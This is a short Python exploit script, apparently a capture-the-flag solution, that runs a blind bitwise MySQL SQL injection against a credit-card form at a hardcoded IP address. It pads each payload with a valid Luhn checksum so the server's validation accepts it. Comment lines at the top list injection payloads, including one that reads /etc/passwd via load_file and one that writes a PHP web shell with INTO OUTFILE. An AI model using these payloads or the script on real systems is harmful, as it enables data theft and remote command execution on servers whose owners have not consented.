#we use only letter, no number
#select key from keys where key='number'
#SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'

#4111111111111111 - true 
#4111111111111111' and 0=0#
#4111111111111111' union select 0,0#
#4111111111111111' union select 0,load_file('/etc/passwd')#
#!/usr/bin/env python

from albatar import *
from baluhn import generate
from urllib import quote

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if 'Your CC has been compromised' in body:
    return 1
  else:
    return 0

def add_luhn(s):
  digits = filter(lambda c: c.isdigit(), s)

  # our payload must have an even number of digits otherwise the serve computes
  # a different checksum than us
  if len(digits) % 2 == 0:
    s += '0'
    digits += '0'

  return quote(s + generate(''.join(digits)))

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://52.91.163.151/',
      body = 'cc=4111111111111111${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = add_luhn,
      )

  template = "' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask} -- "

  return Method_bitwise(make_requester, template)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print(r)
